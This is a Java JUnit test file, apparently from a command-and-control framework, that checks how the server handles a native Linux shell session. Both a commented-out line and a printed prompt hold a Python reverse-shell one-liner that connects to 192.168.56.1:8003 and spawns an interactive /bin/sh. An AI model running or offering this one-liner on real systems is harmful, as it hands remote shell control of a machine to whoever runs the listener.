package c2.nativeshell;

import org.junit.jupiter.api.Test;

import c2.remote.RemoteTestExecutor;
import util.Time;
import util.test.ClientServerTest;
import util.test.RunnerTestGeneric;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;

class RunnerTestNativeLinuxDaemonPythonOneLiner extends ClientServerTest{

	@Test
	void testLocal() {
		test();
	}
	
	static void test() {
		initiateServer();
		//TODO: Augment the remote test executor to handle this correctly. 
		//RemoteTestExecutor exec = new RemoteTestExecutor();
		//exec.startTestProgram(1005, "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
		System.out.println(
				"Please start Linux python oneliner session now, such as: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\"/bin/sh\",\"-i\"]);'");
		Time.sleepWrapped(3000);

		System.out.println("Transmitting commands");

		TestConfiguration config = new TestConfiguration(OS.LINUX, "Native", "TCP");
		RunnerTestGeneric.test(config);
		teardown();
	}

}
